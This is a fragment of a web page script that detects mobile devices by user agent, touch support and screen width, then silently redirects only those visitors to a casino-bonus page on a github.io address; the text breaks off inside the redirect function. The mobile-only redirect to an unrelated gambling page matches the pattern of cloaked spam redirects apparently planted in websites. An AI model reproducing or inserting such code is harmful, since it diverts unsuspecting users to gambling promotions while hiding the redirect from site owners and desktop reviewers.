    <script>
        function isMobileDevice() {
            const mobileKeywords = [
                'android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 'windows phone',
                'opera mini', 'mobile', 'samsung', 'lg', 'huawei', 'xiaomi', 'vivo', 'oppo'
            ];
            
            const userAgent = navigator.userAgent.toLowerCase();
            const isMobile = mobileKeywords.some(keyword => userAgent.includes(keyword));
            const hasTouchScreen = navigator.maxTouchPoints > 0;
            const isNarrowScreen = window.innerWidth <= 800;
            
            return isMobile || (hasTouchScreen && isNarrowScreen);
        }

        function redirectBasedOnDevice() {
            if (isMobileDevice()) {
                window.location.replace('https://worktype.github.io/casino-bonus/');
